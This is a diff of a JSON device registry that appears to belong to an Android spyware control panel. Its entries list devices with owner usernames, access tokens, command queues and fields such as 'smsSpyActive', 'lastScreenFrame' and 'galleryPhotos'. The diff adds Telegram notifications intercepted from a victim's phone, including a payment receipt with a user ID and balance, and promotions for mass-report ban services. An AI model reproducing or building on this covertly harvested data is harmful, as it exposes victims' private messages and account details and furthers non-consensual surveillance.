@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776956975103,
+    "lastSeen": 1776956984103,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -16669,7 +16669,7 @@
     "deviceName": "HP-XXX-2D24",
     "ownerUsername": "is",
     "token": "34abd4f14a5676f3cd2d30b18941c847",
-    "lastSeen": 1776956975885,
+    "lastSeen": 1776956981846,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-23T15:09:35.885Z",
@@ -16684,7 +16684,48 @@
     "lastPhoto": null,
     "lastScreenFrame": null,
     "smsSpyActive": true,
-    "smsMessages": [],
+    "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "FELIX HOSTING TESTI",
+        "content": "\n💰 DEPOSIT BERHASIL\n━━━━━━━━━━━━━━━━━━━\n\n📋 TRANSACTION DETAILS\n• ID Deposit: #RO20260423230723251368\n• Nama User: 𝐑𝐔𝐋𝐙𝐘 [𝐄𝐗𝐄] 💮\n• Jumlah Deposit: Rp 5.000\n• Metode Pembayaran: QRIS\n• Points Earned: +1\n• Tanggal: Apr 23, 2026\n• Waktu: 22.08.08\n\n📊 USER STATISTICS\n• User ID: 8426561117\n• Saldo Total: Rp 7.900\n• Status: ✅ Transaksi Sukses\n• Sistem: Auto Processing\n\n🎯 ROYALTY SYSTEM\n• Total Points: 1\n• Deposit Count: 0x\n• Reward Status: Active",
+        "time": "23/04 22:09",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776956984480
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝟮𝟲.𝟬𝟲",
+        "content": "ACC BACKUP GW\nCLICK",
+        "time": "23/04 22:09",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776956984380
+      },
+      {
+        "appName": "Telegram",
+        "sender": "REHAT / SLOWRESS",
+        "content": "Ended task: #fNDPPPqV",
+        "time": "23/04 22:09",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776956984323
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝐌𝐔𝐑𝐁𝐋𝐀𝐒𝐓 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 #𝐂𝐁𝟏: 𝙁𝙚𝙡𝙯亗 [LIMIT REHAT SAMPAI 20 APRIL]",
+        "content": "𝗢𝗣𝗘𝗡 𝗠𝗨𝗥𝗕𝗨𝗚 𝗠𝗨𝗥𝗔𝗛 𝗠𝗘𝗥𝗜𝗔𝗛 𝗗𝗔𝗡 𝗣𝗔𝗦𝗧𝗜 𝗡𝗬𝗔 𝗚𝗔𝗖𝗢𝗥 ☠️☠️☠️\n\n🤖💀𝗠𝗨𝗥𝗕𝗨𝗚 𝗢𝗧𝗔𝗫/𝗦𝗖𝗔𝗥𝗥𝗬 𝗗𝗘𝗔𝗧𝗛🥴🥵☠️\n\n𝗠𝗘𝗠𝗕𝗘𝗥 𝟲𝗞\n𝗥𝗘𝗦𝗦𝗘𝗟𝗘𝗥 …",
+        "time": "23/04 22:09",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776956984301
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "1000 pesan baru dari 78 obrolan",
+        "time": "23/04 22:09",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776956984207
+      }
+    ],
     "galleryPhotos": [],
     "galleryDone": false,
     "contacts": [],
